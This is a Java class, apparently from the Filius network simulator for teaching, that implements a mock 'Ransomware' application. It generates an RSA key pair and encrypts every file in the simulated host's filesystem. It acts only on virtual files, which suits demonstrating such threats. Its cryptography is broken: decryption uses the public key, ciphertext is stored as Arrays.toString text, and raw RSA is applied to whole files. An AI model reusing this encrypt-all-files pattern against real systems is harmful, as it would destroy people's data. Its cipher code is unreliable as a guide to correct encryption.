package filius.software.ransomware;

import filius.software.Anwendung;
import filius.software.system.Datei;
import filius.software.system.Dateisystem;

import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import java.security.*;
import java.util.Arrays;
import java.util.LinkedList;
import java.util.logging.Logger;

public class Ransomware extends Anwendung {

    private static final Logger logger = Logger.getLogger(Ransomware.class.getName());
    private PublicKey publicKey;
    private PrivateKey privateKey;

    @Override
    public void starten() {
        try {
            KeyPairGenerator keyPairGenerator = KeyPairGenerator.getInstance("RSA");
            keyPairGenerator.initialize(4096);
            KeyPair keyPair = keyPairGenerator.generateKeyPair();
            privateKey = keyPair.getPrivate();
            publicKey = keyPair.getPublic();
        } catch (NoSuchAlgorithmException e) {
            logger.warning("An error Occured while generating the Pair of Keys: "+e.getMessage());
        }
    }

    public PrivateKey getPrivateKey() {
        return privateKey;
    }

    /**
     * Encrypt all Data in the Filesystem
     */
    public void encryptData() {
        Dateisystem dateisystem = getSystemSoftware().getDateisystem();
        LinkedList<Datei> linkedList = dateisystem.dateiSuche("", "*");
        for (Datei datei :
                linkedList) {
            try {
                Cipher cipher = Cipher.getInstance("RSA");
                cipher.init(Cipher.ENCRYPT_MODE, publicKey);
                datei.setDateiInhalt(Arrays.toString(cipher.doFinal(datei.getDateiInhalt().getBytes())));
            } catch (NoSuchAlgorithmException | NoSuchPaddingException | InvalidKeyException | BadPaddingException | IllegalBlockSizeException e) {
                logger.warning("An error occur while encrypt the files: "+e.getMessage());
            }
        }
    }

    /**
     * Decrypt all Data in the Filesystem
     */
    public void decryptData() {
        Dateisystem dateisystem = getSystemSoftware().getDateisystem();
        LinkedList<Datei> linkedList = dateisystem.dateiSuche("", "*");
        for (Datei datei :
                linkedList) {
            try {
                Cipher cipher = Cipher.getInstance("RSA");
                cipher.init(Cipher.DECRYPT_MODE, publicKey);
                datei.setDateiInhalt(Arrays.toString(cipher.doFinal(datei.getDateiInhalt().getBytes())));
            } catch (NoSuchAlgorithmException | NoSuchPaddingException | InvalidKeyException | BadPaddingException | IllegalBlockSizeException e) {
                logger.warning("An error occur while decrypting the files: "+e.getMessage());
            }
        }
    }
}
